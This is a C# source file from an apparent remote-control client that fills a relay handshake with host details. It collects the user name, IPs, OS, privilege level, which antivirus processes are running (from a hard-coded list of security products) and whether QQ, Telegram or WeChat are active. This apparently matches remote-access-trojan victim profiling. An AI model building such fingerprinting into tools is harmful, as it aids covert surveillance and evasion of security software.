using System;
using System.Collections.Generic;
using System.Diagnostics;
using System.Globalization;
using RemoteControl.Protocals;
using RemoteControl.Protocals.Relay;
using RemoteControl.Protocals.Response;

namespace RemoteControl.Client
{
    partial class Program
    {
        static ResponseGetHostName CreateHostInfoResponse(ClientParameters paras)
        {
            ResponseGetHostName resp = new ResponseGetHostName();
            resp.HostName = System.Net.Dns.GetHostName();
            resp.AppPath = System.Windows.Forms.Application.ExecutablePath;
            resp.OnlineAvatar = paras.OnlineAvatar;
            resp.UserName = GetCurrentUserName();
            resp.LocalIP = string.Join(", ", CommonUtil.GetIPAddressV4().ToArray());
            resp.OSVersion = Environment.OSVersion.VersionString;
            resp.Privilege = GetPrivilegeText();
            resp.CameraStatus = "Unknown";
            FillBossExInfo(resp);
            return resp;
        }

        static void FillHostInfo(RelayHandshake handshake)
        {
            if (handshake == null)
                return;

            handshake.UserName = GetCurrentUserName();
            handshake.LocalIP = string.Join(", ", CommonUtil.GetIPAddressV4().ToArray());
            handshake.OSVersion = Environment.OSVersion.VersionString;
            handshake.Privilege = GetPrivilegeText();
            handshake.CameraStatus = "Unknown";
            FillBossExInfo(handshake);
        }

        static void FillBossExInfo(RelayHandshake handshake)
        {
            HashSet<string> processNames = GetProcessNames();
            handshake.Antivirus = DetectAntivirus(processNames);
            handshake.OnlineQQ = GetOnlineText(HasAnyProcess(processNames, "QQ", "TIM", "QQProtect"));
            handshake.TG = GetOnlineText(HasAnyProcess(processNames, "Telegram"));
            handshake.WX = GetOnlineText(HasAnyProcess(processNames, "WeChat", "Weixin"));
            handshake.UserStatus = "Online";
            handshake.Region = CultureInfo.CurrentCulture.Name;
            handshake.ISP = "";
        }

        static void FillBossExInfo(ResponseGetHostName resp)
        {
            HashSet<string> processNames = GetProcessNames();
            resp.Antivirus = DetectAntivirus(processNames);
            resp.OnlineQQ = GetOnlineText(HasAnyProcess(processNames, "QQ", "TIM", "QQProtect"));
            resp.TG = GetOnlineText(HasAnyProcess(processNames, "Telegram"));
            resp.WX = GetOnlineText(HasAnyProcess(processNames, "WeChat", "Weixin"));
            resp.UserStatus = "Online";
            resp.Region = CultureInfo.CurrentCulture.Name;
            resp.ISP = "";
        }

        static HashSet<string> GetProcessNames()
        {
            HashSet<string> names = new HashSet<string>(StringComparer.OrdinalIgnoreCase);
            try
            {
                foreach (Process process in Process.GetProcesses())
                {
                    try
                    {
                        if (!string.IsNullOrEmpty(process.ProcessName))
                            names.Add(process.ProcessName);
                    }
                    catch (Exception)
                    {
                    }
                    finally
                    {
                        try
                        {
                            process.Dispose();
                        }
                        catch (Exception)
                        {
                        }
                    }
                }
            }
            catch (Exception)
            {
            }

            return names;
        }

        static bool HasAnyProcess(HashSet<string> processNames, params string[] candidates)
        {
            foreach (string candidate in candidates)
            {
                if (processNames.Contains(candidate))
                    return true;
            }

            return false;
        }

        static string GetOnlineText(bool online)
        {
            return online ? "Online" : "Offline";
        }

        static string DetectAntivirus(HashSet<string> processNames)
        {
            string[] candidates = new string[]
            {
                "MsMpEng", "SecurityHealthService", "QQPCRTP", "QQPCMgr",
                "360sd", "360tray", "avp", "AvastSvc", "avgsvc", "ekrn",
                "mcshield", "bdservicehost"
            };
            List<string> found = new List<string>();
            foreach (string candidate in candidates)
            {
                if (processNames.Contains(candidate))
                    found.Add(candidate);
            }

            return found.Count > 0 ? string.Join(", ", found.ToArray()) : "Unknown";
        }

        static string GetCurrentUserName()
        {
            try
            {
                return System.Security.Principal.WindowsIdentity.GetCurrent().Name;
            }
            catch (Exception)
            {
                return Environment.UserName;
            }
        }

        static string GetPrivilegeText()
        {
            try
            {
                System.Security.Principal.WindowsIdentity identity =
                    System.Security.Principal.WindowsIdentity.GetCurrent();
                if (identity != null && identity.IsSystem)
                    return "System";

                System.Security.Principal.WindowsPrincipal principal =
                    new System.Security.Principal.WindowsPrincipal(identity);
                if (principal.IsInRole(System.Security.Principal.WindowsBuiltInRole.Administrator))
                    return "Administrator";
            }
            catch (Exception)
            {
            }

            return "User";
        }
    }
}
